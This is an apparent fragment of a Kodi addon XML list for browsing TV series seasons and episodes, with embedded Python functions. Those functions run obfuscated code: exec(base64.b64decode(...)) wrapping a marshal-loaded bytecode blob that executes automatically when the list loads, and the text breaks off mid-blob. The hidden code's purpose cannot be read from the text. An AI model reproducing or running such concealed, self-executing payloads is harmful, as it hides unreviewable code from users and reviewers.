<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,xbmc,random,urllib2,xbmcgui,base64
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MFF3OEFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFVlROT2JVMHlXa1JWZDAxNlVYcFBSRmsxVGxSSk1rNXFXVFJOZW1zeVRucEtiVTV0U1RCYVJGRXdUbXBaTWxwRVdUTk9ha2t3VDBSWk5VNTZaM3BPUkZWNlRrZFpNVTVVWXpGT1ZHc3dXWHBOZUU1RVJUSk5WRnBzVG1wak1sbDZZelJPVjBVeFRYcFNhVTVxWnpOT2VrMHdUbTFSZWs1VVdtbE9WR2N3VG1wVk1VNTZTVEJQUkZFeFRsUkZNMDlVVVRWTmVrVXpUMFJaTVU1SFRUTlBSRTB5VFcxWmVrMVVVVEpPZWswelRXcGpkMDU2VVRCT1JFMHdUakpGTUU1cVZYZE9hbXN6VG5wUk0wNXFaekZOYWxVd1RrZEZNMWxVVW10T2FtdDZUa1JSTlUxNlkzcE9hbFUxVFcxWk0wNUVVbTFPVkdkNlQwUmthRTVVWTNwT2VtTXlUbGRGTTA5RVdUSk9lbGt5V1ZSak5VNVVRVEZOUkVwdFRXMVplazFFWTNkT2VtdDZUMVJTYlUxNlVUTk9hazB6VFhwbmVrMUVUVFJOZW1kNVdtcFZORTVxVlROTmFscHJUbXBSTWxwVVNtMU5iVmw2VDBSYWJFNHlSWHBPYWtwdFRtcFpNMDlVWXpOTmJVa3dXbXBWTVU1SFRYcE9lbGw2VG1wbmVWbHFTbTFOYlZreVdrUmFiRTF0U1RKYVZGWm9UbnBaZWsxNlkzcE5lbU15VGtSTk0wMTZSWGxhYWtwcFRXMVpNMDVVVlRGT2Vra3dUMFJOZUU1cVdURk9hbGw2VFhwamVrMTZUVEZPYlVrd1dtcE5NazF0U1hwT1ZGSnBUWHBaZVZwcVl6Qk9SMUV3V1ZSWmVVNTZZekZPZWsxNVRYcFZNazlVVFhwT2VrRXpUa1JaZVU1VWF6Rk9hbEpzVFhwbmVrMTZZelJPYWsweVRtcFZNMDVVVVRGUFJGSnJUa1JWZWs5VVkzbE9WMFY2VGxSU2FFNUhSVE5OVkZrelRsUmplVnBxWTNsT2FtZDZUbXBaTVUxNlRUSk9WR040VGtSTk0wNUVWVFJPYW1ONlRXcGFiVTVxYXpKYWFrMTRUbnBuTWs1VVRUUk5lbEY2VFZSa2FFNHlSVEpaVkZreFRYcEpNMDFFVlRGT1JGRXlUWHBOTWsxNlp6Rk5SRTB4VG5wUmVWbHFXVEpOZWswd1dYcE5lazVxVlRKWlZGbDRUbnByTVUxcVNtMU5lbFV6VFdwV2FFNXRVVE5QVkZWNlRYcFpNRTU2VFhkT01rVXlXWHBaTVU1cVNUQk9lazE1VG5wVk1FNVVZekpPZW1jeFRXcEtiVTVxVlhwTlZGa3hUbTFKTWxscVRUSk9SR2N5VGxSUmVrMTZUWHBPUkZVeFRucE5NVTFxV1hwTmVrVXdXbFJWTlU1cVdUSmFSRTE0VG0xUk1GbFVXVE5PYlZFeVdXcE5NazVxWXpGTlZGVXhUakpGZWs1VVl6Qk9iVWw2VFhwUk1FNVVhekJPZWxKcVRsUnJNazlFWTNsT1ZGVXpXVlJSTUU1VVl6Rk5lazEzVG5wUk0wNTZXbXRPYlUweFRrUk5lVTF0U1RKTlZGcHJUWHBKTUU1NldtdE9ha2t5V2tSak1VNTZVVEpOYWxsNFRXMVplVmxxVVROTmVtZDVXV3BXYUU1dFVUQlBWR04zVG0xWk0wMUVUVE5PVkZreVdYcGpNVTVFVlROT1JHTjZUbFJWTVUxNldYbE9iVVV4VDFSVk1FNUVVVEpOYWxwdFRsUkplVnBxVlRKT2JWRXhUMVJqTUU1cVl6SmFWRlY1VG5wUk1FMVVZelJPZW1jeFQxUlZlVTV0VlROUFZFMDFUbXBGZWsxcVZUSk9iVlV4VGtSV2FFNVVVVEJPUkZwc1RtMVpNMDlVV20xT2VsVXhUMVJTYTA1dFZUTk9lbFYzVGtSWmVrMVVXVFJPZW1jeFQwUmpNMDU2UVRKT1ZGazFUa1JaZWs5VVZtaE9ha2t5VGtSa2FFNVVSVEZPUkZGNVRrZFJlazVxVVRSTmVrRjZUa1JaTlU1RVJUSk9SRTAwVFhwRk1rNXFWWGxPVkVFd1dYcGthRTVVVFRGTlZFMTNUbXBWTWs1NldUSk5lbGt4VFdwamQwNTZRVEpaYW1NeVRsZEZNazlFWTNwTmVtTXdXa1JWZDAxdFNURk5WR04zVG0xRk0xbFVZekZPVkdjeFRrUlplRTVxWXpOT1ZFMHdUbTFSTVU5VVZtaE9WRUV3VFZSWk1rMTZWVE5PVkZGNlRYcGpNazU2VW14T2Fsa3dUbFJOTkU1cVVYbFphazAwVGtSck1rOUVUWGhPZWtFeVQwUlNiRTU2UlROTmVtTjZUa1JSZWs5VVRUVk9hbFV5VGxSWk1FNXRTVEJPVkdNd1RsUnJNbHBxV1RWT2FrMTVXV3BqTUUxNlJUSk5WRTE1VG5wak1FOUVXbXBPUkZFd1dWUlpNMDVFYTNwUFJGazBUWHBKTUZwVVdYaE9SRlV3V2xSS2FVNTZRVEJPUkZwc1RYcGpNbHBxVVRST2Vsa3dUWHBOZWs1VVkzcE9WRkY1VFcxSk1GcFVXVE5PVkdjd1dtcGpNVTV0UlROT1JFMDBUbXBuZWsxNlRURk9SR3N3VFdwak0wNXRWWHBOUkZKclRtcEZNVTVxV1hoT1Ixa3pUVlJWTkU1dFJUTlBSR041VGxSak1scFVWVEJPVkVrd1QxUmpNVTU2WXpGT1JGa3lUWHBCTUZsVVZYcE9lbGt5VDFSUmVVNVVaek5QVkZGNVRsUlJNbGxVV21sT2VrRjVXbXBWTVU1SFdUTk9hazEzVGtSWk1rNVVTbTFPYlZFeFQwUldhRTE2VVRKYVZFcHBUbTFWZWs1RVkzbE9iVkY1V1dwVk1VNUVaek5PVkZwb1RsZEZNMDVxWXpST1JFbDZUMVJOTlU1VVJYcE9lazE1VGtSVk1VOVVWVEZPVkdzeFRWUlJlRTU2VVhwT2FsSm9UbnBKZWsxVVVYbE9la2t5VDFSU2FrNUVVVE5PUkUwMVRrUk5NVTFVV1RST2FsRXdUWHBqTTA1cVozcE5lbFY0VFcxWmVrNUVWVEJOZW1NeFRYcFJlVTF0V1RGTmVsVjNUbXBKTTA1NlZUUk9WMFV3VFdwWk1rNVhSVEJhUkdNMFRrUk5NazU2V210T1ZGRXlXbFJhYlU1NldUQmFWR00xVFhwWk1FOUVZekpPYlZFd1RucFJORTVVU1RCYWFscHJUWHBGZWsxNlVYcE9WRkV4VFZSVmQwMXRXVEJPYW1Nd1RtcGpNVTE2VFRKT2FsVXlXbXBWZUU1cVVYcFBWRnBxVG5wTk1rNXFWVE5PVkVrd1RsUlJORTF0U1ROT2VscHRUbTFWTTA1cVdUTk9lbFV5VG5wamVVNVVRVE5OVkZVMVRtcFJlVnBxVVROT1Iwa3lXbFJaTTAxdFNYcFBSRlY1VG1wVk1rOVVVbTFOZW1ONlRrUmpORTE2VFROUFJGVXlUVzFKTUU5VVdYcE5lbXN3VGxSU2EwMXRTVEJhUkZreVRtMUpNVTlFWXpWT1JFVXlUWHBOTlU1cVl6Rk5lbGt5VGtSUmVrMVVXbWxPVkZVd1RYcFZkMDVxVVRGTlZFMHdUbFJaZWs1cVZYaE9SRkY2VDFSamQwNUVhekpOZWxwcFRrUlJlazFFVFhkTmVrRXlUbnBhYkU1NmF6Rk9lbU0xVGtSbmVrOUVVWHBPVkdjeFQxUmFiVTU2YXpCTlZFMHlUbXBqTVU1VVRURk9SMVV5VGxSTk5FNXFWVE5QVkZwclRXMUpNbGxVV1hoT1YwVjZUMVJaZUU1dFZURk9lbU4zVGtSUk1VNUVXVE5PYWxGNlRucFpOVTVFWjNwT2FrMDBUa2RKTUUxNlkzbE5lbWN3VG5wUk0wNXFZek5PYWxWNVRtcE5NVmxVVW1wT2FtY3lXbFJqTUUxNmF6Sk9lbFV4VGtkRk1rNUVUVE5PYlVVeVRXcGpNRTU2WnpGTlJHTXdUbnBSTTAxRVZUVk9SMWt5VG1wYWFFNUhWVEpQUkdONlRYcEJNRTFxU20xT2JVVXlUbXBTYUU1VVJUTk9SRnBxVG1wbk1rNVVXVE5PUkdONVdtcFNhRTVxVlROUFZHTTFUbnBqZVZscVRUUk9WRlY2VDFSU2EwNXFZM2xhYWxVeFRucEpNMDFxV1RKT2VrRXdUMFJqTUU1dFZUTk9hbU16VGtkWk1rNXFVVEpPZWxrd1QwUlJNRTVVVFRKTlZGbDZUWHByTTFsVVdtdE9WRUV5VGtSa2FFNXFTVEJPVkZGNlRtcFpNVTFVWTNsT2JVMTZUbnBLYVU1VVVUSk9hbEUwVGxSQk1rMVVVWGxPUkZGNlQxUlplVTV0U1RCT1JFMHpUbFJSTTA1VVdUQk9SRmt3VDBSamVrNXRXVEJhYWxsNlRsUk5NazVxVW0xT1IxRjVXV3BOTkU1RVJUSmFSRXBwVFhwUk1FNXFTbTFOZWtFeFQwUmpNVTV0U1RCUFJGa3lUbXBqTVU1RVRUVk9SMFV3V21wUmVrNVVTWHBPYWxKcVRucE5lazFxVFhwT2VrVXhUbnBSTlU1RVVYbGFhbGswVGtSSk1VMVVZekpPVkdzeFQwUk5ORTR5UlhwTlZGVTFUbGRGZWsxNlRUVk9iVVV3V1ZSU2FrMXRTVEJaYWxKb1RXMUpNazlVWTNkT1IwVjZUWHBOZVU1VVRURk9SRlY2VGtSVk1scFVUVFZPUkUweFdWUlNhazU2VVRGTmFsRTFUbnBSTVU1cVNtMU9SRlY2VDFSTmVVMTZWWHBPZWxrMVRtMU5NVTFFWXpOT1JGRjZUMVJaTlU1WFJYcE9lbFY0VG0xSmVWbHFWWGhPUkdjeFRrUlNhRTVIVlRGT1ZGbDRUa1JuTWs5VVZtaE9iVmt3V1dwTk5FMTZRVEJOYWsxNlRtcHJNazFVVVRGT1JGRjZUMFJSTVU1VVNYcE5lbHB0VGpKRmVrNUVWVFZOZW1jeVQxUlNhRTVxVlRCT1ZGcHBUbFJuZWs5VVdYcE5lbEV3V2xSWk1rNXFSVEJQUkZKclRXMVpNbGxxVlRKTmJWa3dUa1JrYUU1RVRURlBSR040VGtSRk1rMXFXWGxPUkVrd1RYcFdhRTR5UlROT2FrMHdUa1JKTWs1RVVUUk9SRWt5VGxSWk1rNTZaekZPZWxsNlRsUkZNbHBFVFROT1ZFVjZUVVJOTkU1SFRUTlBWRkV4VFhwcmVrMXFXVE5OYlZreldWUmpNMDVYUlhsYWFsSnFUa1JaTTAxRVVURk9WRkV5VFhwYWFVNTZaM3BPYWxVMVRrUkZNVTVFWXpKT2FtTXhUVVJTYkU1dFVURk5WRTB6VGtkUk1rNVVXVE5PYWtsNlQwUlZlazVVV1RGTmFsVTBUbTFaTUU1cVpHaE9Na1V4VG1wYWFVNXRWVEZQUkZKclRsUkplazlVVW1oT1ZGVXdXbXBqZWs1RVNYcE5lazAwVGtkTk1VOVVVbXhOYlZsNlRsUmpNazVFVFRKTmFsRTBUbXBaTWxscVpHaE5iVWt3V2tSYWFrNVVWVEpOYWxGNlRrUnJlVnBxVVROT1IwVXhUWHBWTkU1SFNUQlBWRTB4VGtSRk1FNUVUWHBOZWxrd1RsUlplazU2YTNwT2FscHNUbFJCTUU1cVZUSk9lbFV3V1hwUk1rNTZTVE5OUkZreVRtcEZNMDFFWXpCT1JGa3hUV3BOZWs1NlRURk5lazAxVGtSck1sbDZTbWxPVjBVeVRsUmFhVTF0U1RCT1ZGSnRUWHBuTTA5VVl6Tk9SMFY1V1dwWk0wNXFVVE5QVkZFeVRtcE5lazVxVlhsTmVrMHpUMVJSZUUxNlJYcFBWRkpvVG1wbk1VMTZXVEpPVkUwelRrUkthVTVxUlROUFZGazFUbTFWTWs1NlVYaE5iVmt4VDFSWk5FNUVZekZPVkZGNlRrUm5lVnBxVVRWT1ZFbDZUa1JqZDA0eVJUSlBSRmswVG5wTk1FMVVUWHBPYlZrd1dWUlNiVTVFVVRGWlZGcHRUbTFOTWs1NlkzbE9SMVV5VGxSVk1rNVVRVEZPZWxFeFRsUmpNRTFxV1RCT1ZHc3dXV3BqTUU1RVRUSlpWR04zVG5wWk1sbHFZelZOZWtVd1RucE5kMDU2V1RKT1ZGVXpUWHBqTUU1cVl6Rk9SR2N3V1ZSUk1FNXFXVE5PVkdNMVRrUlJNVTlFV21sT2VrRXpUbnBqTWsxNlZUQmFSRXB0VG0xSk1sbFVUVEZPYWtVelRYcGpNRTE2U1RGTmVrMDFUbFJKZWs5RVZUVk5lbEV6V1ZSYWFrNUVhM2xhYWxGNFRrUmplazVVVFhsT01rVXhUbXBSTUUxNlVUQk9SRlUwVG1wSk0wMUVZM2xPVkVsNlRYcGpkMDVFVlRCUFJGa3pUbTFGTUZsVVl6Qk5lazB4VDBSYWJVNUVaek5QVkdNeVRYcHJNazU2VlhwT2Fra3dUbXBWTTA1dFNUQlplazB4VG1wak1rNVVXbWhPUkUweVRtcFpORTVVVVhwTmVrMTNUa1JqTTA1RVVtbE5iVmt5V1dwUmVrMTZWWHBOUkZwdFRrUnJlVnBxVVRWT1JGVjZUMVJqZWs1SFRUQlplbHB0VG5wWk1scFVWWGRPVkZrd1RucFpNVTVVWXpKT2VsRjZUbFJuZVZwcVVYaE9iVlYwUXc4QUFERmFSMGcwV20xSU1FSlJXalZCVVZZd1RIZEZka0Z0ZEcxQ1IxcHRRVlJFTUVKUlYzcEJWRll5V2tkSU1VRkhUakZDUjAxM1ducE1iVnBSU0RGYWVsWXhXa2RGZDBFeVVqQkJVWEJzV20xYU0wRjNjRFZCYlVSdFduZGFiVUZ0ZURKTmQzQXhRVkY0TUUxSFdqVmFiVVF3UWtkRU0xcHRkREZCUjB3eFdtMVdNVnB0Y0d4QlVVZ3lRWGRhTlZwdFVqQmFiVm8wV20xT01rMUhXbXRCVkZZeFFWRmFNRUYzY0cxQmJYQTFRVkY0TTBGM2NESkJkM0JzVEhkRU5WcHRVak5DUjB3eFFWRlNNVUpSUkRWQmQwd3dRa2RhTWxwdGNEQkJkMW94UVVkU2JWcHRUWHBCVVZvelFYZElNMEZSV2pKTmQxZDZRVWRTYlVGM1dqUmFiVlp0UVVkRU5VRkhjREpCZDBoclFVZFNNa0ZSVEd4YWJYUXlURzFhYWtGVVdteE1kMHh0UVZSV01GcHRjREpCZWt3elFWRk1iVnB0U0RGTVIzQnFRVlJJTWsxM2NESkJNbEp0V25kSU1FRjNTREpNYlVneldtMUlNVnAzVERKQlIxSXdRa2RJTkZwdFdqRkJkMW94UVZGd01rRjNTR3RCZDNBeFFVZHdiVnA2VmpCQlIwd3hRVzFTTUVKSFNHMWFiVXd6UWtkd00wRjNSRzFDVVZwdFFWUlNNa3hIVFhWYWJWcHRRVWROZVZwdGVEQkNSM0F3V20xRU1rRnRjRFJhYlVodFdsRk5kMEZIV2pOQ1VVaHJXbnBNTWsxSFJHMUJiWGd5UWtkTmQwRnRURzFCZDB3MFFXMUlNVUYzUlhaQmJYZ3lRVzF3TVZwdFRERkJVWEF5UVcxYU1FRlJUREphYlZJelFYZEVNVUZ0ZEcxQ1IxcHJRVkZXTWsxSFNEVkJkM2d6UVhkYU1FRjNTRE5CUjAxNlFVZFdiVUpIUlhsQlVVZ3dRVkZhYWtGVVdtMUNSMW8xUVhkYU1VRkhSREphYlhBd1FWRmFNMEYzY0RKQlIzQTBRVkZ3TWtGUlJERkJlbFl3UVcxYU1FRnRXbXhNZDBRelFWRjBiVnBSUkRWQlZFd3dXbTFhYlVGNlJERkJSMW8xUVZGNGJVSlJXakJCZDNBd1FYZGFha0ZIVmpCYWJWb3hRVWRXTWsxSFNEVkJkMXB0UWxGRmRVRjNTREZDUjAxMVFXMTRNRTFIVFhsQlZGWXpRVWRGZFVGVVdtMUNSM0YxUVcxd2JWcEhUWGhCZDB4dFFsRkVNRUZSVERCTVIxbzFRVXBTTWt4SFREVkJSMFJ0UWtkTmVFRlVXbTFCZDB3MVFUSlNNRUYzUlhsYWJVd3dRa2RGZFVGM1dqRkNSMFYxV20xME1FRlJUREpCZWtReVRFZEVNMEZ0VERKQmQwUXdRVlJJTTFwSFRYcEJWRXd4V2tkYWFscDZURE5DUjBRd1FYZE1NbHAzU0d0QlIwd3lRWGRhYkVGM1NERmFiWEF5UVhkd01rMUhXakpCUjNBd1RYZHdNVnB0VEROQ1VVaHJXbTFhTUV4M2NEQmFiWGd5UWtkd05FRkhkRzFhUjB3eVFYZE1iRTEzV2pOQmJVNXNUWGRJTkZwdFRHMUJSMGcwUVcxRWJVRkhSRFJCZDFJeVFrZGFNVUZ0VWpKQ1VVdzFXbTFNTUZwSFREUkJSM1F3VEcxRmRVRlJTREpNZDFvMVFYcElNRXh0Y0RCQlIzZ3pRVzFhYWtGUmNERmFSM0F5UVhkRU1VRnRTWFZCVVVnelFVZE5lVUZIV20xQ1IwZ3pRVzFFTWxwM1NHMUJVVm93UVcxd2FrRkhlRE5hVVhCc1FYZFNNMEZ0Y0d4YWJYaGhVVVJqTUhCNmVXaHVTMFUxVmxFd2RGY3hRVUZCYkdjMlJ6RkVOVVZ0VDAxSWJVRlRiMUpuZDI1TFRVOUhla1ZZUlhZNVQyNTVSR3hHZWtsSlFWRkJVa1oyWjBOQlIwRjVja2hOTUZwdFR6SkpVVVUxU1cxeGRrbElVMUZ2VkZkR2NXMUJka1V5VXpCd2JWY3lSREpJYlVGUlUxZHZlRFEwUVZSQlpFWjNlVWhFUzNWV2NubE5kMXA0UVZwSGQwRnVjRlZFTWxwVlkxSndTalZJYjFOMVZVUjZPVEpaTWxONVJWSkpTSEZJUVdKSGVXSTBRVk5KWmtSR09XaElNSGxtY0RKSmEzSlRVMWx1YlZZMVIzZDVRM0ZVZUcxdVZVVmtTRXByVFVRd1oxZE5TRXd5Y1ROUFIwMVVhMHR4VTFkUWJsSkphVWhoZUd4Q1UzVm1TSGRhTWtsS1Z6VkJTV05YVFZWRmJFSlNOVzFITURsdFNIcDVla0pWY1d0R1NHdG9RVXBtYTBsMk9VVkZNMU5pUnpCbldFRXpZMGx4ZUUxWVJVbHhOSEZMUVcxTWVFd3pjRk5JTTI5UmVVZEdTbGROUjBoTmJFWXhRVFp1ZVZkUVdXMXhka2Q2TlcxRWVVNDBRWGRKTmtGSlltMUliR2RrY0ROeFFraFNlREZJUzA4MFNYaG1NSEpKVDJsTU0zbFJSa2hUVFVZeWRYbHhWRUZrUVZGSVpVbExUekJITUhsbWJsUjBOSEpTV21seFZGTmpjSGw1YkhBeVYwTkNVVUV3U1cxTmJuSktOV0pHUm1kSVFrbE5WMjU1ZVdwTVNrbFNSRWQwTWtjemVUSkZiR2RrVFhoclNrUXpTWGxhWVZOTlNsUkplRUZzT1c1YWVuQnRiblk1ZUc1VU1WQndVMFZtV2pKTmVVMUlUV0p2TW1jd1FWUm5XbTh3Vm1WSVZVd3ljREo1VFVKS1oyMXVTazAxYmpOVFVYRkpTWGx4TVVsVlFrdDViVVZHWjBOdmJVOVZjSGxKWW5KNlYxbE5NbVpwVEVsMVprZEhlRFJDUjFwdFJ6Qm5hbGh0VDA5S1NERm5RVlJGTWxwaGREVndWWGw0UmxGSlVFaFJUMUZJZW1OcmNsSlNiRmt4ZVd4QmJVMWpRVEYxVlc1SmRWWkJNbmxuVEV0SU1FMHpZMmx2U2tScFREQnhkWEV6VTJKd1IwbFZSM1puWmtoVVUyTkJNWGd4U2t0amRVWnRWMEZNZDFkSldUTndNRTB6ZUdwYU1VMXRUVWgxU0VSNk1XUnZkMEZxUkVweGVrMXNPV0p1U0hreVdsSmpZa0ZLTkRGeVUwbHNjVXBTYTB3emNWbEliRGxWUVRKRk5VRlFaMUpHTUZOaGNsRkpXRUV6VTJ0SlVYVkJjRXBOWlVReWFqRnVTVWw2VFROaldrUXdkWHBOYkRrMVJXMVNNRUpMWTB0dWJVRlZTVkZ4TWtaNGNVRkpWRk0wY1VoeFFVMHlWalZHVTNSdGIzcE1hVTFLUVhwdk1ubFpUSGhhWlZwVFdtbEJNWGxwUWtoNFpVZElhMUZIVVhGcVNsUm5XRWhWUVdGTk1HTmhjVEl4VVVSNlpqVnhZVUZqVFRCbllVUkpVak5KTUdkb2NESTVaWEV6Y0RKeGVHY3lRVWhKYlhKS1NXNXVlRWxIY2xCblZVWkhVMEZGU1VGYVNXRkZTVWRMUldWeWVrVm5Sa3Q1UmtKVlYwMUZTM0Y2UjFGUGRuRXlTWGRNZDNsQlRIZHhXWEJWY0RSdllWTXdXVzFYWm5CNlUyZHhWR3RaVFcxVFJYQlNkREZFU0dObldqSTFZa1V3V210Q1IwOUtURXRQVlVwTFZteEpiRGxtU0VsSllrMUxUVzFHWVU5cFFsRkVORzlUVjJKd01GTnFibFE1VlVSSlJURktVMGxvUVd4blowZFNaM3B3TWxZeVRVcE5lWEJHWjFCQ1NGTnVjRXQxTlVWNmEyMVlNVk41YjBoalozQnRWMGx2YlhScVdUSTFSMEV6VDFaQlNFaHFSMG94TWtGSGVWZEVlalYyU2tsSU1WZ3dhek5JYlV3emJ6QkJlVzVLU1VKd1NsTlJSbnB4WmtWM2VUTnlVVkl3VFhnMVpWcDRlVmxJZWxZMVFsVjFhazFKUlV4eWVGTklTSGRCUTBaUlVtVkJNMDFIY1VZNGJYQkdaMWRIU21KdFFYcDVORzh6Y1VWSFlYVmtja2ROUm05NmVXWk5iR2RpUVhkVGFFSklTVmxJU0djMlRUTjVaMEZMY1daQlMzVk5TbEZKWWtaSFFVdHVTRVZQYjFKVFYyOTRVak5JTWpGaVdsSm1NRVY0WW10YVVVOTZSbFZqYlVsSVZ6WkNSMXBzUkVkUE0zQjRSV2xDU0RReVdHMXhlRUpTZFVsQlVWTXpja2ROVEVVeU9YbHdTRVZRUVZSd00wbEpRWFp1U210VVdERk9iVTFJT1RaeE1rMHpTVWxCUm00eVREUkJlWGxEUkVkSlNuSmhVak5HVTBsMlJUQmpNRmt4WTJ4YVNFVlBUREZpWlUxNmRVbEdTMU5LYjFGME5FRjZPVWxOZDFaclNIZElaVzVSVDAxQlNsTk5SbEZOUjBwS2VXeGFVVUZRY1ROWGFVZEtOVTl2UjBrMlRVZElhMDE1WWpWTmJYbEhXREF4V2tkSGVEQk5iVWxtU0ZRd2JVZFRkR1ZaTTFOaFNIWm5iazF0Y1dWS1NYbG9Ra2R4WW05M1YyZHZWVUZvU0hoTlFscFJlWHB2ZWpsWWJsRkJZMjUyT0RGYVIwVmlTREZKYm5KaFUySmFVbU5zV1RCQlowUXdOV0phUjBFeGNUTlhSbTkzU1d0Sk1FRmFia2RCWWtsSlltbHdlakZGUWxWUGJVMXRlVnBIZVVsMVJYaGpTVVl3ZVdOSmVqaHJia3BCTVc1SlJESllNRFJxU0VwRmRVVktRVkpCVlVGR1dHMU5VSEpLZEd4YU1VaHNiMHBGTlUweldtVkdVMW96U0V0QmEwWnRWekZZTVZOb2JtMU5ORnBLTlZaR1lYRmpjRXRUVDBsVFQyUk1lREExY1VkNWJVUXdhelpOTTBWVFNYZE5TRUpMVjJwS1IzQnRXbmRQVDNGdFYwOUVNRk5wU0ZSTmRYRmhkWGxaTVVGUWNEQlhUMGhIUkdwRmJYRTBSVXBKYm5CNFoyeHZSM1ZXVFhoQlRYRlVabTF2TW5WRldHMUJRM0Y0ZURORWJVODJjSFk1UTB3eVYyUmFNR05WUjBwMVFVaDRhM1ZIUzBsaldqQXdhMGQ0U1ROeE1EUTFUWHBxTUhCNlNYWkZNblZRV2t0WE5raHRWMHhGZW5sVmNWVkpTbkJKVTI1SlZEVjFTVE41TkVGaFFVSkplblZWUjNkRWJGa3hTVmR5VVVSbFNVZzRiRVozVjJORk0wdzFXbnBUZDB4SU1VcHlWRGxvUVZSNWFFcEpZalJGWVhGdVdETkZaVmd4VjJWdVVtTjZjbE5PYlc1UlJXRnlSMDlZY1ZCblpVZDVZakJCTUVGNVFYZDFla0V6U1dWR1lVeGxSR0Z4U0ZwaFV6WktTRkl6UmpOeE1tNHpUbTFJTVVRemNURjRha1JoUVhwQlNFRTBSMVJ3WlVoaFZqVktlWEZsV2xWeGVGcGhRVlpZTUVWNlRHMUViRnBIVDNWR00zbGtXa3A1TUVGNVkybEVNRVZTU0cxQmJIQlZlVmxJTWtsdVFURmphVzh3TUdsR00zRjVjRWxKVVVaMk9WQk5NazFvV2pKd2JFVjNTRFJNU2xac1FsVk5iWEpUUVZGQ1MxTmliakpCUjI5VlFXZHlTblZUVEVvMVpFeDJPVWxIVVVGRmIzZFROSEI0VTFSR1Uxb3hiMjFCZUUxNE5YZFliWGxFY21GQloyNVRTRFZJVkRrd1draEpTMEY2TlRCRlMweHJSMkZ4Tm05U1JXUmFNM2xKYmxKbU1FWkxWekJHU2tVeGIxSXhhMXA0TlU5YVNEazFUREZUVFhCTFkxcEtVVTEzUkVkNVZtOHljVk5GVVZORlRVcEJWMFpTYWpGSVUxSTBSMHByTUVWTGVVeE5NbGRQVERCeFNrSkxXbTFCYlUxRFJETlRWbkF3ZVRCSVVtZHJTWGRUV1UxdFZ6WnVWVTEzUWtwRlNtNUpWMlJhU2xkTlIwaEZibHA2WTNaRVNIVkxSRWhKVkZwVGNVdHdkMGxqUWxOaWJVaFZRV2hOVTBWS1JHRlBUWEpMVjI1eVJtZFdjRzFGTTB3eVZ6TnZkM2xVU0hsMU5FZDNlVUZGZDNGclRHMVhka3BSVFVKSFZYbDJRVEpKVmt4M1JVRktkbkJCVUhvNWJFeEtRV1pOUms0NVZsQndNRUZIY0RKQmQwZ3lRa2RJYkVGNldqQk1kMFY1UVVkU00xcDNXbXBCVVhBelRFZGFNa0YzZERCYWQwMTNRWHBXTUVGdFdtdEJWRXd4UWxGRWEwRjZXbTFCYlhCclFYZE1NbHBIUlhWQmVsSnRRVkZJTlZwdFVqRkJiVnB0UVcxd01rSlJXbXhCZDBReFFYZEZkVnB0VWpCYVIxb3pRVWRJTUUxM1NHcEJiVm93UWxGd01WcHRlREZhZDB3elducFdNa3h0V2pGQlVVUnNUWGROZDBGUlVqQk5SM0EwUVcxME1FMVJjR3RCYlVReVRWRk5la0Y2U0RGQ1VVMTFRWGRNTUVGM1JEVkJiWGh0UVhkTU0wRlJWakJhYlZwclFXMWFNRTFIVjNwQmJWWXpXa2ROZFVGM1NEQmFSMFEwUVZGYU0wRkhjR3RCYlhBeVFYZGFiRUYzY0RCYWQweHNRVWR3YlZwdGNHcEJVVVF6V20xTU5GcHRjRzFDVVVoc1FXMVNNRTFIUkd4QmQxcHRXbTFKZFVGSFRteE5kM0JyUVVkRU1FeHRXbXBCVVV3eFFXMXdhMEZSU0RCYWJVeHRRVkZJTUUxM1dtdEJkMUl6UVcxSWJFRkhUak5hYlVodFFVZDBRdzhBQUdzd1RsUlZORTE2YXpKWmFsSnJUbTFaTTA5VVpHaE9SRVV3VDBSWk0wNTZWVE5PZWxVd1RYcG5NRTVxVVhsT2VrVXdXWHBqTTA1dFdURk9SRmt3VGxSak1VNTZVbWhPZW1NelRWUkthVTVFVVROT1JGVXdUbXBWTVUxNlRUQk9SMFY1V21wTmVFNUhWVEJQVkZWNFRrUlJNRTVxVlRST1ZFVXlXV3BTYkU1NlFUSk9SRmw0VG5wVk1rMTZVWGxPUkVVelRucGpkMDVIV1hwT1JHTXpUbXBOTUU1cVl6Qk9lbU14VGtSUmVVNXRVWHBPUkZKb1RtcGpNRTlFVW1wT1ZHY3hUa1JaZUU1SFNYcE5SRkUxVG5wQk1rOUVWWGxPYlZrd1drUmpNMDV0VFRKT1ZGSm9UbnBSZVZwcVdYbE9lbGt6VFhwTk5VNTZaekpQUkZKcFRsUlpNazU2WXpKT1JFa3pUVVJSTUU1dFdUQlphazEzVG1wRk1rOVVVbXROZWxreFRVUlpNaz